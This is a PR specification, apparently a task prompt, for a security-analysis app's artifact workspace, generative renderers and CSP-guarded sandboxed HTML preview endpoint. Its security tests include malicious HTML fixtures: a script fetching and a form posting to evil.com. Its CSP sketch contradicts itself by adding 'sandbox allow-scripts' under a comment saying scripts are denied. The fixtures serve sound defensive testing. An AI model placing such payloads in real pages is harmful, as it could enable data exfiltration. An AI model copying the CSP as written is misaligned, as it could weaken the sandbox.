# Prompt PR-5 (Issue PR E) — Workspace + generative renderers + sandboxed HTML + backend read-models

> Issue: #18 · PR breakdown del issue: **PR E — workspace and generative renderers**
> **Requiere PR B (typed schemas) + PR C (shell) merged en `main`.** Paralelizable con PR D (execution UX) — comparten directorio `munin-ai/` pero archivos distintos.
> Referencia autoritativa: Issue #18 comentarios C3 §7-8 (Workspace + Artifact controls), C4 §8 (Generative UI), §9 (Sandboxed HTML), C5 §10-12 (Artifact + Evidence + Run detail read models), C7 §7 (Artifact workspace) + §8 (Evidence) + §9 (Run).

---

## 1. Objetivo

Construir el **Context Workspace** (4 tabs: Artifacts / Evidence / Run / Agents), los **14 generative renderers** allow-listed con versión `@1`, el **sandboxed HTML preview endpoint** (NO srcDoc), los endpoints backend de read-model faltantes (artifact list, artifact upload, artifact notes, sandbox-preview, evidence lists, run detail), y la página `/artifacts/[id]` para "Open in new view".

PR E reparte su backend en 6 endpoints. **El issue NO define un PR de read-model separado** — estos endpoints se consolidan en PR E.

## 2. Rutas permitidas

### Backend
- `munin/production/store.py` (EDIT — métodos nuevos alarged read-model + forward migrations para artifact metadata + evidence table opcional)
- `munin/production/chat.py` (EDIT — 6 nuevos endpoints GET/POST)
- `munin/production/asgi.py` (EDIT — registrar nuevos endpoints)
- `tests/test_artifact_list.py` (NUEVO)
- `tests/test_artifact_upload.py` (NUEVO)
- `tests/test_artifact_notes.py` (NUEVO)
- `tests/test_artifact_sandbox_preview.py` (NUEVO — **sanity/security crítico**)
- `tests/test_evidence_list.py` (NUEVO)
- `tests/test_run_detail.py` (NUEVO)

### Frontend
- `app/src/components/WorkspacePane.tsx` (NUEVO)
- `app/src/components/workspace/ArtifactsTab.tsx` (NUEVO)
- `app/src/components/workspace/EvidenceTab.tsx` (NUEVO)
- `app/src/components/workspace/RunTab.tsx` (NUEVO)
- `app/src/components/workspace/AgentsTab.tsx` (NUEVO)
- `app/src/components/renderers/` (NUEVO directorio — 14 renderers):
  - `IocTableRenderer.tsx`, `AssetExposureRenderer.tsx`, `CveAssessmentRenderer.tsx`, `InvestigationTimelineRenderer.tsx`, `RelationshipGraphRenderer.tsx`, `MarkdownReportRenderer.tsx`, `JsonTreeRenderer.tsx`, `CsvTableRenderer.tsx`, `CodeFileRenderer.tsx`, `CodeDiffRenderer.tsx`, `MermaidRenderer.tsx`, `ImageRenderer.tsx`, `CommandTranscriptRenderer.tsx`, `SandboxedHtmlRenderer.tsx`
- `app/src/lib/munin-ui/renderers.tsx` (EDIT — conectar los 14 renderers al registry via `register()`)
- `app/src/lib/production-api.ts` (EDIT — typed methods: `listArtifacts`, `getArtifact`, `getArtifactInline`, `getArtifactDownload`, `getArtifactSandboxPreview`, `uploadArtifacts`, `listArtifactNotes`, `addArtifactNote`, `updateArtifactNote`, `deleteArtifactNote`, `listEvidence`, `runDetail`)
- `app/src/hooks/useArtifact.ts`, `useArtifactContent.ts`, `useEvidenceList.ts`, `useNotes.ts` (NUEVO — TanStack Query hooks para cada endpoint)
- `app/src/app/artifacts/[artifactId]/page.tsx` (EDIT — stub PR C → rellena con fetch by id + registry lookup)
- `app/src/components/renderers/__tests__/*.test.tsx` (NUEVO — tests por renderer)
- `changes.md` (AÑADIR)

### Rutas prohibidas
- `munin/core/**` excepto donde `progress_emit.py` necesite emitir `data-evidence` events (PR E debe pedir cambios en PR D vía PR description, no tocar aquí en este PR)
- `app/src/components/munin-ai/**` (PR D es dueño salvo `ArtifactReference` y `EvidenceReference` de PR C)
- `app/src/lib/munin-ui/schemas.ts|group-parts.ts` (PR B es dueño)

## 3. Backend: 6 endpoints + read-models (C5 §10-12)

### 3.1 Artifact storage extensions (C5 §10)

Forward migration (DDL checksum locked — usar patrón idempotente existente):

```sql
ALTER TABLE conversation_artifacts ADD COLUMN title TEXT;
ALTER TABLE conversation_artifacts ADD COLUMN renderer_key TEXT;
ALTER TABLE conversation_artifacts ADD COLUMN schema_version INTEGER NOT NULL DEFAULT 1;
ALTER TABLE conversation_artifacts ADD COLUMN metadata_json TEXT;  -- JSON blob
ALTER TABLE conversation_artifacts ADD COLUMN provenance_json TEXT;
ALTER TABLE conversation_artifacts ADD COLUMN parent_artifact_id TEXT REFERENCES conversation_artifacts(id) ON DELETE SET NULL;
ALTER TABLE conversation_artifacts ADD COLUMN version INTEGER NOT NULL DEFAULT 1;
ALTER TABLE conversation_artifacts ADD COLUMN preview_policy TEXT;  -- 'inline'|'sandbox'|'download_only'
ALTER TABLE conversation_artifacts ADD COLUMN content_encoding TEXT;  -- 'utf-8'|'base64'|'binary'
CREATE INDEX IF NOT EXISTS idx_artifacts_conv ON conversation_artifacts(conversation_id);
CREATE INDEX IF NOT EXISTS idx_artifacts_run ON conversation_artifacts(run_id);
```

### 3.2 Endpoints EXACTOS del issue (C5 §10):

- `GET /api/conversations/{conversation_id}/artifacts?limit=50&cursor=...` — list paginated, omits content
- `GET /api/runs/{run_id}/artifacts?limit=50&cursor=...` — list paginated
- `GET /api/artifacts?conversation_id=&run_id=&media_type=&renderer=&limit=&cursor=` — cross-conv search (C3 §1 Artifacts button)
- `GET /api/artifacts/{artifact_id}` — single artifact metadata + content (if small)
- `GET /api/artifacts/{artifact_id}?inline=true` — existing behavior, MIME allow-list
- `GET /api/artifacts/{artifact_id}?download=true` — existing behavior, Content-Disposition attachment
- `POST /api/artifacts/uploads` — create durable artifact from upload (C3 §6 Composer Attach button)
- `POST /api/artifacts/{artifact_id}/notes` — operator note creation
- `PATCH /api/artifacts/{artifact_id}/notes/{note_id}` — note update
- `DELETE /api/artifacts/{artifact_id}/notes/{note_id}` — note delete
- **`GET /api/artifacts/{artifact_id}/sandbox-preview`** — HTML preview with strict CSP, separate response

### 3.3 Run detail read model (C5 §12)

```python
async def run_detail_endpoint(request: Request):
    run_id = request.path_params["run_id"]
    actor = await _require_auth(request)
    if not await _can_view_run(actor, run_id): return _forbidden()
    return JSONResponse(await store.get_run_detail_for_actor(actor_id=actor.id, run_id=run_id))
```

Response JSON (C5 §12):
```json
{
  "run": {"id": "...", "state": "...", "created_at_ms": 0, "lease_owner": "...", "duration_ms": 0, "model_profile": "..."},
  "tools": [{"tool_call_id": "...", "tool_name": "...", "state": "...", "elapsed_ms": 0}],
  "reasoning": [{"id": "...", "kind": "provider_reasoning"|"operational_summary"|"operator_guidance", "text": "..."}],
  "activities": [],
  "subagents": [{"subagent_id": "...", "subagent_type": "...", "state": "...", "duration_ms": 0, "objective": "...", "summary": "..."}],
  "human_requests": [{"request_id": "...", "action": "...", "state": "...", "nonce_hash": "...", "expires_at_ms": 0}],
  "guidance": [{"guidance_id": "...", "state": "...", "applied_at_step": 0, "body": "..."}],
  "artifacts": [{"artifact_id": "...", "title": "...", "renderer": "ioc-table@1", "size_bytes": 0}],
  "evidence": [{"evidence_id": "...", "kind": "...", "title": "...", "source_url": "...", "confidence": 0.9}],
  "summary": {"entities": [], "findings": [], "decisions": [], "open_tasks": [], "confidence": 0.5},
  "truncated": {"reasons": [], "limits_applied": {}}
}
```

Large tool output/artifact content remains separate and fetched by ID.

### 3.4 Evidence list endpoints (C5 §11)

```python
GET /api/runs/{run_id}/evidence
GET /api/conversations/{conversation_id}/evidence
```

Initial implementation: derived read-model joining `artifacts + tool_calls + summaries + human_requests.evidence_json`. NOT a dedicated table (yet) — only add `evidence_items` table if lifecycle (promote/annotate/verify) requires it.

### 3.5 Sandbox-preview — contrato de SEGURIDAD (C4 §9)

```python
async def sandbox_preview_endpoint(request: Request) -> Response:
    artifact_id = request.path_params["artifact_id"]
    actor = await _require_auth(request)
    if actor is None: return _unauthorized()
    art = await store.get_artifact_for_actor(actor.id, artifact_id)
    if art is None: return _not_found()
    if art.media_type != "text/html": return _bad_request("sandbox preview only for HTML artifacts")

    response = HTMLResponse(art.content)
    response.headers["Content-Security-Policy"] = (
        "default-src 'none'; "
        "base-uri 'none'; "
        "form-action 'none'; "
        "frame-ancestors 'none'; "
        "navigate-to 'none'; "
        "sandbox allow-scripts"  # note: scripts DENIED by default per CSP, only opt-in separate capability
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Referrer-Policy"] = "no-referrer"
    # IMPORTANT: do NOT include Set-Cookie or any auth headers on this route
    return response
```

CSP denies default: scripts, network connections, forms, top navigation, popups, parent access, external fonts/images unless explicit proxied upgrade.
NO cookies, NO same-origin, NO auth in query string.

Para interactive HTML (scripts enabled): separate opt-in capability, different isolated origin — **not part of PR E**.

## 4. WorkspacePane — 4 tabs (C3 §7, C7 §7)

```tsx
export function WorkspacePane({ open, onClose }: { open: boolean; onClose: () => void }) {
  const { conversationId } = useMuninContext();
  const [tab, setTab] = useState<"artifacts"|"evidence"|"run"|"agents">("artifacts");
  const [pinned, setPinned] = useState(false);

  return (
    <aside className={cn(
      "bg-surface border-l border-border flex flex-col min-w-0 min-h-0",
      // Resizable future; PR E fixed 480px desktop with collapse
      open ? "w-full md:w-[480px] shrink-0" : "hidden"
    )}>
      <header className="h-10 flex items-center gap-1 px-3 border-b border-border bg-surface">
        {(["artifacts","evidence","run","agents"] as const).map(t => (
          <button key={t} onClick={() => setTab(t)} aria-label={`workspace ${t} tab`}
            className={cn("px-3 py-1 rounded-md text-xs font-mono uppercase tracking-wide transition-colors",
              tab === t ? "bg-active text-accent border border-borderStrong" : "text-muted hover:text-body border border-transparent")}>
            {t}
          </button>
        ))}
        <PinButton pinned={pinned} onClick={() => setPinned(p => !p)} />
        <CloseButton onClose={onClose} />
      </header>
      <div className="flex-1 min-h-0 overflow-y-auto">
        {tab === "artifacts" && <ArtifactsTab conversationId={conversationId} pinned={pinned} />}
        {tab === "evidence" && <EvidenceTab conversationId={conversationId} pinned={pinned} />}
        {tab === "run" && <RunTab runId={activeRunId} />}
        {tab === "agents" && <AgentsTab runId={activeRunId} filter={agentFilter} />}
      </div>
    </aside>
  );
}
```

**Pin behavior**: when pinned, subsequent `data-artifact` events in stream NO auto-replace the selected artifact. Local UI state only.

### 4.1 `ArtifactsTab.tsx`
- `useArtifactList(conversationId)` via TanStack Query (`listArtifacts` endpoint).
- Lista: filename, title, media_type badge, renderer badge, size, timestamp.
- Click → drawer con `ArtifactDetail` mostrando renderer via `lib/munin-ui/renderers.tsx` lookup.
- Drag-and-drop reordenar Y pin (futuro). Por ahora orden cronológico desc.
- Empty state: `// No artifacts yet for this operation`.

### 4.2 `EvidenceTab.tsx`
- `useEvidenceList({ conversationId })`.
- Lista: title, kind, source_url (link externo), confidence bar, producer tool, timestamp.
- Click → drawer con evidence metadata + linked artifact (ArtifactReference compacto).

### 4.3 `RunTab.tsx`
- `useRunDetail(runId)`.
- Muestra: estado pill, started/duration, model/provider, lease status, cancel button (reusa Composer CancelConfirmDialog).
- Mini-timeline de lifecycle events (run.cancel_requested → cancelling → cancelled).
- Tool/job count, subagent count, HITL count, guidance count (con link al Composer guidance banner).
- Reusa `CommandTerminal` de PR D para mostrar logs truncados si user wants raw.

### 4.4 `AgentsTab.tsx`
- `useRunDetail(runId).subagents`.
- Tree view parent/child. Click subagent → filter lista con subagent_id.
- Muestra: subagent_type, state, elapsed, summary, tools/jobs count (link PR D SubagentGroup), artifacts count (link ArtifactsTab).

## 5. 14 Renderers — contrato EXACTO (C4 §8, C5 §10)

Registra en `lib/munin-ui/renderers.tsx`:

```tsx
import { registry } from "./part-registry";
import { IocTableRenderer } from "@/components/renderers/IocTableRenderer";
// ... 14 imports

export function registerMuninRenderers() {
  const renderers = [
    { key: "ioc-table@1", description: "IOC table with filter/sort/copy/export", component: IocTableRenderer, dataSchema: iocTableDataSchema },
    { key: "asset-exposure@1", ... AssetExposureRenderer },
    { key: "cve-assessment@1", ... CveAssessmentRenderer },
    { key: "investigation-timeline@1", ... InvestigationTimelineRenderer },
    { key: "relationship-graph@1", ... RelationshipGraphRenderer },
    { key: "markdown-report@1", ... MarkdownReportRenderer },
    { key: "json-tree@1", ... JsonTreeRenderer },
    { key: "csv-table@1", ... CsvTableRenderer },
    { key: "code-file@1", ... CodeFileRenderer },
    { key: "code-diff@1", ... CodeDiffRenderer },
    { key: "mermaid@1", ... MermaidRenderer },
    { key: "image@1", ... ImageRenderer },
    { key: "command-transcript@1", ... CommandTranscriptRenderer },
    { key: "sandboxed-html@1", ... SandboxedHtmlRenderer },
  ];
  for (const r of renderers) registry.register(r as any);
}
```

Cada renderer recibe `{ data, provenance }` validated. `dataSchema` defines what `data` should look like (Zod).

### 5.1 Specs mínimas por renderer

| Renderer | data shape | Notas |
|---|---|---|
| `ioc-table@1` | `{ columns: Column[]; rows: Row[] }` con `Column = {key, label, type: 'string'\|'number'\|'datetime'\|'confidence'}`. | Filtro, sort, search, paginate (server si rows>200), copy as CSV, export download |
| `asset-exposure@1` | `{ assets: Asset[]; exposures: Exposure[] }` | Map future. PR E: tabla joined con severity pill |
| `cve-assessment@1` | `{ cve_id, cvss_v3_score, cvss_severity, epss_score,\nfirst_seen_ms, last_seen_ms, affected_products, references[] }` | KEV chip en accent violeta si true, CVSS pill color, EPSS bar horizontal, links NVD |
| `investigation-timeline@1` | `{ events: [{id, at_ms, kind, title, summary, source_ids}] }` | Vertical timeline border-l border-border pulsante |
| `relationship-graph@1` | `{ nodes: [{id, label, kind}], edges: [{from, to, label, kind}] }` | PR E placeholder: render JSON graph en code viewer hasta `cyto` integration future |
| `markdown-report@1` | `{ markdown: string }` | Reusa MarkdownRenderer existente; no `rehype-raw`; code blocks con shiki |
| `json-tree@1` | `{ value: any }` | Árbol expandible. Strings accent, numbers info, booleans warning, null muted |
| `csv-table@1` | `{ headers: string[], rows: string[][] }` | Header sticky `bg-raised`. Scroll horizontal interno `overflow-x-auto` |
| `code-file@1` | `{ filename, language, content, lineNumbers?: boolean }` | CodeBlock (adaptación AI Elements) con copy button, shiki highlight por `language`, line-numbers opt-in |
| `code-diff@1` | `{ hunks: [{oldStart, oldLines, newStart, newLines, lines: string[], type: 'add'\|'del'\|'context'}] }` | +/- verde/rojo, soporta unified y git diff |
| `mermaid@1` | `{ diagram: string }` | `mermaid` lib render en useEffect con target id; fallback error card con diagram source |
| `image@1` | `{ src: string, alt?: string }` | lazy loading, lightbox dialog on click |
| `command-transcript@1` | `{ stdout: string, stderr: string, meta: string, command?: string, elapsed_ms?: number }` | Reusa `CommandTerminal` del PR D variant passthrough stream |
| `sandboxed-html@1` | `{ artifact_id: string, content_preview?: string }` | **Ver §6** |

## 6. `SandboxedHtmlRenderer.tsx` — contrato EXACTO del issue (C4 §9)

```tsx
export function SandboxedHtmlRenderer({ data, provenance }: { data: { artifact_id: string }; provenance?: any }) {
  const artifactId = data.artifact_id;
  const previewUrl = `/api/artifacts/${artifactId}/sandbox-preview`;

  return (
    <div className="flex flex-col min-w-0 min-h-[420px]">
      <div className="flex items-center gap-2 px-3 py-2 bg-raised border border-border rounded-t">
        <AlertTriangle className="w-4 h-4 text-warning" />
        <span className="text-xs text-warning font-mono">Sandboxed / untrusted HTML · {artifactId}</span>
      </div>
      <iframe
        sandbox=""
        referrerPolicy="no-referrer"
        src={previewUrl}
        title={`Sandboxed preview ${artifactId}`}
        className="w-full min-w-0 flex-1 bg-bg border border-border border-t-0 rounded-b"
      />
    </div>
  );
}
```

**PROHIBIDO**:
- `sandbox="allow-same-origin"`
- `sandbox="allow-scripts"` (default deny scripts in PR E; interactive HTML is separate opt-in)
- `sandbox="allow-forms"`, `sandbox="allow-popups"`, `sandbox="allow-modals"`, `sandbox="allow-top-navigation"`
- Incluir `Set-Cookie` en el backend response
- Exponer tokens en query strings del `src`
- `srcDoc` (raya: src vía endpoint separado con CSP header garantizado)

## 7. `app/src/lib/production-api.ts` — additions

```ts
listArtifacts(params: { conversation_id?: string; run_id?: string; media_type?: string; renderer?: string; limit?: number; cursor?: string }): Promise<ArtifactList>;
getArtifact(id: string): Promise<ArtifactDetail>;
getArtifactInline(id: string): Promise<Blob>;            // ?inline=true response.blob()
getArtifactDownload(id: string): Promise<Blob>;          // ?download=true response.blob()
getArtifactSandboxPreview(id: string): Promise<string>;  // ?inline=true response.text() — backend denies non-HTML
uploadArtifacts(file: File, opts: { conversation_id?: string; run_id?: string }): Promise<{ artifact_id: string }>;
listArtifactNotes(artifactId: string): Promise<Note[]>;
addArtifactNote(artifactId: string, body: string): Promise<Note>;
updateArtifactNote(artifactId: string, noteId: string, body: string): Promise<Note>;
deleteArtifactNote(artifactId: string, noteId: string): Promise<void>;
listEvidence(params: { conversation_id?: string; run_id?: string }): Promise<EvidenceItem[]>;
runDetail(runId: string): Promise<RunDetail>;
```

## 8. Open in new view → `/artifacts/[id]/page.tsx` (C3 §8)

```tsx
export default function ArtifactPage({ params }: { params: { artifactId: string } }) {
  const { data, isLoading, error } = useArtifactDetail(params.artifactId);
  if (isLoading) return <FullPageFallback text="Loading artifact…" />;
  if (error) return <FullPageError />;

  const entry = registry.get(data.renderer as RendererKey);
  return (
    <div className="h-screen bg-bg flex flex-col">
      <header className="h-12 border-b border-border flex items-center px-4 text-secondary text-sm font-mono">
        <Link href={`/`} className="hover:text-accent">←</Link>
        <span className="ml-3">{data.title || data.filename}</span>
        <span className="ml-2 text-muted text-xs">{entry.key}</span>
      </header>
      <div className="flex-1 p-6 overflow-y-auto">
        <entry.component data={data.content} provenance={data.provenance} />
      </div>
    </div>
  );
}
```

## 9. Tests

### Backend
- `tests/test_artifact_list.py`:
  - GET por conversation_id paginado (cursor funciona)
  - GET por run_id
  - GET con filters media_type, renderer
  - 403 si actor no tiene acceso a la conversation/run
  - 401 sin auth
- `tests/test_artifact_upload.py`:
  - POST con multipart file crea artifact durable
  - Response retorna `{artifact_id}`
  - Large body > MAX_ACCEPTED → 413
  - MIME typing from file extension OK (allow-list serrver-side)
- `tests/test_artifact_notes.py`:
  - POST create note linked to artifact
  - PATCH update note
  - DELETE note
  - 403 si actor no es author del note (solo own notes)
- `tests/test_artifact_sandbox_preview.py` — **SANITY CRITICAL**:
  - HTTP response includes CSP header
  - CSP includes `default-src 'none'`
  - NO `Set-Cookie`, NO `Authorization` echoed back, NO session header
  - Response Content-Type `text/html`
  - Malicious HTML fixture: `<script>fetch('https://evil.com')</script>` con CSP default-src 'none' → script NO ejecuta
  - `<form action="https://evil.com">` con form-action 'none' → form NO puede enviar
  - 400 si artifact no es text/html
- `tests/test_evidence_list.py`:
  - GET /api/runs/{run_id}/evidence retorna lista con fields esperados
  - GET /api/conversations/{id}/evidence
  - 403 si actor no tiene acceso
- `tests/test_run_detail.py`:
  - Response JSON contiene las 10 secciones (`run/tools/reasoning/activities/subagents/human_requests/guidance/artifacts/evidence/summary/truncated`)
  - Large tool output NO embedded (only metadata; content fetched via /api/artifacts/{id})
  - 403 if actor can't view run

### Frontend
- `app/src/components/renderers/__tests__/IocTableRenderer.test.tsx`:
  - Renderiza columnas y rows correctas
  - Sort ascendente/descendente al click header
  - Filter por search reduce rows
  - Copy CSV button copia al clipboard
  - Paginación client si >50 rows
- `app/src/components/renderers/__tests__/CveAssessmentRenderer.test.tsx`:
  - KEV chip visible si `kev:true`
  - CVSS pill color verde/amarillo/rojo según severity
  - EPSS bar ancho proporcional a score
  - Links a NVD abren en new tab con rel="noopener noreferrer"
- `app/src/components/renderers/__tests__/MermaidRenderer.test.tsx`:
  - Mermaid válido renderiza diagrama
  - Mermaid inválido (syntax error) fallback a error card mostrando source
- `app/src/components/renderers/__tests__/SandboxedHtmlRenderer.test.tsx` — **SANITY CRITICAL**:
  - iframe `src` apunta a `/api/artifacts/{id}/sandbox-preview`
  - `sandbox=""` attribute (vacío)
  - `referrerPolicy="no-referrer"`
  - NO `srcDoc`, NO `sandbox="allow-same-origin"`, NO `sandbox="allow-scripts"`
  - Header warning visible con "untrusted"
  - Malicious HTML fixture: server response sets CSP default-src 'none' → no script execution

## 10. Verificación

```bash
python -m compileall -q munin tests
python -m pytest -q tests/test_artifact_list.py tests/test_artifact_upload.py tests/test_artifact_notes.py tests/test_artifact_sandbox_preview.py tests/test_evidence_list.py tests/test_run_detail.py
cd app
npm run lint
npm run typecheck
npm run build
npm test -- renderers
npx playwright test sandbox-html.e2e.spec.ts
```

### Sanity test `app/playwright/sandbox-html.e2e.spec.ts` (C3 §10 + C7 §3):
```ts
test("malicious HTML artifact cannot exfiltrate parent/cookies/auth", async ({ page }) => {
  // Setup backend with known malicious artifact
  // Render via /artifacts/{id} route
  // Assert page console no error messages about parent access
  // Assert network requests only to /api/artifacts/{id}/sandbox-preview, nothing external
  // Assert iframe sandbox attribute is empty string (no allow-same-origin)
  // Assert NO Set-Cookie header on sandbox-preview response
});
```

## 11. Commit / PR

- Branch: `feat/issue-18e-workspace-renderers`
- Commit: `feat(issue-18e): workspace tabs, 14 generative renderers @1, sandboxed HTML endpoint, artifact/evidence/run read-models`
- PR contra `main`. Requiere PR B + PR C merged. Paralelizable con PR D (trabajan distinta zona del frontend; backend está coordinado por endpoint via this PR).
